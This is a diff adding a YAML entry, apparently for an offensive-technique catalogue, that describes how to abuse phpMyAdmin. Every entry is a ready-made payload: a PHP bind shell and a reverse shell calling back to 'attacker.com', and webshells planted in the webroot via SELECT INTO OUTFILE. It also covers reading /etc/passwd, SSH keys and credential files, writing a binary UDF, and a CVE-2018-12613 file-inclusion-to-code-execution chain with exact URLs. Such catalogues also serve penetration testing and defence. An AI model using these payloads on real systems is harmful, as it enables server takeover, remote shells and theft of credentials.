@@ -1,0 +1,107 @@
+---
+comment: "phpMyAdmin is a PHP-based web interface for MySQL/MariaDB administration,\
+  \ widely deployed\non LAMP/WAMP stacks. Two independent exploitation paths exist:\n\
+  \n1. SQL file operations (SELECT INTO OUTFILE, LOAD_FILE) \u2014 require the MySQL\
+  \ FILE privilege\n   and that secure_file_priv is empty or includes the webroot.\
+  \ Modern MySQL (5.7.6+) sets\n   secure_file_priv=/var/lib/mysql-files by default,\
+  \ blocking webroot writes. Older installs\n   or custom configs with secure_file_priv=''\
+  \ are exploitable.\n\n2. CVE-2018-12613 LFI-to-RCE \u2014 affects phpMyAdmin 4.8.0\
+  \ and 4.8.1 only. Exploitable by\n   any authenticated user regardless of MySQL\
+  \ privileges, by injecting PHP into the session\n   file via a SELECT query and\
+  \ then including it through a crafted target= parameter.\n\nCommon webroot paths:\
+  \ /var/www/html (Debian/Ubuntu), /var/www (older Debian),\n/srv/http (Arch), C:\\\
+  xampp\\htdocs (XAMPP), C:\\wamp64\\www (WampServer).\n"
+functions:
+  bind-shell:
+  - code: |
+      SELECT '<?php $s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",12345);socket_listen($s,1);$c=socket_accept($s);$p=proc_open("/bin/sh",array(0=>$c,1=>$c,2=>$c),$x); ?>'
+      INTO OUTFILE '/var/www/html/bs.php';
+    comment: "Writes a PHP bind shell to the webroot. Trigger with an HTTP request\
+      \ to\nhttp://victim.com/bs.php \u2014 the page hangs while it waits for a connection.\n\
+      The bind shell then listens on TCP 12345 on all interfaces.\n\nRequires FILE\
+      \ privilege, empty secure_file_priv, and the PHP sockets extension\n(enabled\
+      \ by default on most LAMP stacks). Inbound firewall rules may block the port.\n"
+    connector: tcp-client
+    contexts:
+      admin:
+    tty: false
+  file-read:
+  - code: |
+      SELECT LOAD_FILE('/etc/passwd');
+    comment: "LOAD_FILE() reads an arbitrary server-side file and returns its content\
+      \ as a SQL\nresult row. Useful for extracting /etc/passwd, phpMyAdmin's config.inc.php\n\
+      (which contains MySQL credentials), SSH keys (~/.ssh/id_rsa), or application\
+      \ secrets.\n\nRequires the MySQL FILE privilege. Returns NULL silently if the\
+      \ file does not exist,\nis not readable by the MySQL process user, or secure_file_priv\
+      \ prevents the read.\nBinary files are returned as hex \u2014 use HEX(LOAD_FILE(...))\
+      \ to view them safely.\n"
+    contexts:
+      admin:
+  file-write:
+  - binary: false
+    code: |
+      SELECT 'content to write' INTO OUTFILE '/path/to/output-file';
+    comment: "Writes arbitrary text content to any path writable by the MySQL process\
+      \ user.\nTo write binary content (e.g. a compiled UDF .so), use DUMPFILE instead\
+      \ of OUTFILE \u2014\nOUTFILE adds line-ending translations that corrupt binary\
+      \ data.\n\n  SELECT 0x<hex_of_binary> INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';\n\
+      \nRequires the FILE privilege and a permissive secure_file_priv setting.\nOUTFILE\
+      \ will error if the destination file already exists.\n"
+    contexts:
+      admin:
+  rce:
+  - code: |
+      SELECT '<?php system($_GET["cmd"]); exit; ?>'
+    comment: "CVE-2018-12613: phpMyAdmin 4.8.0\u20134.8.1 include the `target` GET\
+      \ parameter without\nsufficient validation, allowing authenticated users to\
+      \ include arbitrary local files.\nRunning this SELECT injects PHP into the current\
+      \ session file. Then navigate to the\nURL below (replace SESSION_ID with the\
+      \ value of your phpMyAdmin cookie):\n\nLinux:   /phpmyadmin/index.php?target=db_sql.php%3f/../../../../../../../../var/lib/php/sessions/sess_SESSION_ID&cmd=id\n\
+      Windows: /phpmyadmin/index.php?target=db_sql.php%3f\\..\\..\\tmp\\sess_SESSION_ID&cmd=id\n\
+      \nCommand output is returned inline in the HTTP response body.\nThe `exit;`\
+      \ prevents phpMyAdmin's session data from corrupting the output.\nRef: https://www.exploit-db.com/exploits/50457\n"
+    contexts:
+      authenticated:
+    version: |-
+      4.8.0 - 4.8.1
+  - code: |
+      SELECT '<?php echo shell_exec($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php';
+    comment: |
+      Writes a PHP one-liner to the webroot via MySQL's OUTFILE. The file executes OS commands
+      passed via the `cmd` GET parameter and returns their output in the HTTP response.
+      Trigger at: http://victim.com/cmd.php?cmd=id
+
+      Prerequisites: MySQL FILE privilege, secure_file_priv='' or pointing to the webroot,
+      and the MySQL process user must have write permission on the target directory.
+      Check the current setting with: SHOW VARIABLES LIKE 'secure_file_priv';
+    contexts:
+      admin:
+  reverse-shell:
+  - blind: true
+    code: |
+      SELECT '<?php $s=fsockopen("attacker.com",12345);$p=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$x); ?>'
+      INTO OUTFILE '/var/www/html/rs.php';
+    comment: "Writes a PHP reverse shell to the webroot via OUTFILE. Trigger the shell\
+      \ with an\nHTTP request to http://victim.com/rs.php \u2014 the page hangs while\
+      \ the shell is active.\nThe shell runs as the web server user (www-data, apache,\
+      \ etc.).\n\nRequires FILE privilege and an empty secure_file_priv. Windows variant:\
+      \ replace\n/bin/sh with cmd.exe and adjust the OUTFILE path to C:\\xampp\\htdocs\\\
+      rs.php.\n"
+    contexts:
+      admin:
+    listener: tcp-server
+    tty: false
+  webshell:
+  - code: |
+      SELECT '<?php if(isset($_REQUEST["c"])){echo "<pre>",htmlspecialchars(shell_exec($_REQUEST["c"])),"</pre>"; } ?>'
+      INTO OUTFILE '/var/www/html/shell.php';
+    comment: |
+      Deploys a persistent webshell to the webroot via OUTFILE. Access at:
+      http://victim.com/shell.php?c=id
+
+      The shell survives phpMyAdmin restarts and database changes. Output is HTML-escaped
+      for correct rendering of paths and special characters. Requires FILE privilege and an
+      empty secure_file_priv. Adjust the OUTFILE path to match the target's webroot.
+    contexts:
+      admin:
+...
